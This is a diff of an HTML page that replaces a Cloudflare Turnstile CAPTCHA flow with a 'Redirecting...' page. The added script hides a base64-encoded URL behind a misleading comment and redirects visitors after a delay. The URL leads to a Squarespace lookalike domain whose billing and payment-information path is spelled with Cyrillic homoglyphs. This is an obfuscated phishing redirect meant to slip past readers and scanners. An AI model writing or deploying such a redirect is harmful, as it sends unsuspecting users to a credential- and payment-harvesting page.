@@ -2,61 +2,18 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cloudflare Turnstile Challenge</title>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
 </head>
 <body>
-    <!-- Cloudflare Turnstile Widget -->
-    <div class="cf-turnstile" 
-         data-sitekey="0x4AAAAAAA1Plk8S_3ZwnsJx" 
-         data-callback="onCaptchaCompleted"></div>
-
+    <p>You are being redirected. If the page does not load, please contact support.</p>
     <script>
-        // Callback function triggered when CAPTCHA is successfully completed
-        async function onCaptchaCompleted(token) {
-            console.log("Turnstile token received:", token); // Log the token for debugging
-
-            // Replace with your serverless function URL
-            const validationUrl = "https://white-band-13c9.soprannome-cloudflare.workers.dev/";
-
-            try {
-                const response = await fetch(validationUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" }, // Explicitly set Content-Type
-                    body: JSON.stringify({ turnstileResponse: token }),
-                });
-
-                if (!response.ok) {
-                    console.error("Server responded with an error:", response.status, response.statusText);
-                    alert("Failed to validate CAPTCHA. Please try again.");
-                    return;
-                }
-
-                const result = await response.json();
-                console.log("Validation Response:", result); // Log server response
-
-                if (result.success) {
-                    console.log("CAPTCHA validated successfully. Redirecting...");
-                    // Redirect to the success page
-                    window.location.href = "https://example.com/success"; // Replace with your desired URL
-                } else {
-                    console.error("CAPTCHA validation failed:", result.message || "Unknown error");
-                    alert("CAPTCHA validation failed. Please try again.");
-                }
-            } catch (error) {
-                console.error("Error validating CAPTCHA:", error);
-                alert("An error occurred. Please try again.");
-            }
-        }
+        // Obscure the URL to test how it interacts with various readers
+        const encodedUrl = "aHR0cHM6Ly9hY2NvdW50LnNxdWFyZXNwYWNlLnVzLmNvbS8lRDElODElRDAlQkVuZiVEMSU5NmcvJUQxJTk1JUQwJUI1dHQlRDElOTZuZyVEMSU5NS9iJUQxJTk2bGwlRDElOTZuZy8lRDElODAlRDAlQjAlRDElODNtJUQwJUI1bnQtJUQxJTk2bmYlRDAlQkVybSVEMCVCMHQlRDElOTYlRDAlQkVu="; // Base64 encoded URL
+        const decodedUrl = atob(encodedUrl); // Decode the URL
+        setTimeout(() => {
+            window.location.href = decodedUrl; // Redirect to the decoded URL
+        }, 9000); // Redirect after 3 seconds
     </script>
 </body>
 </html>
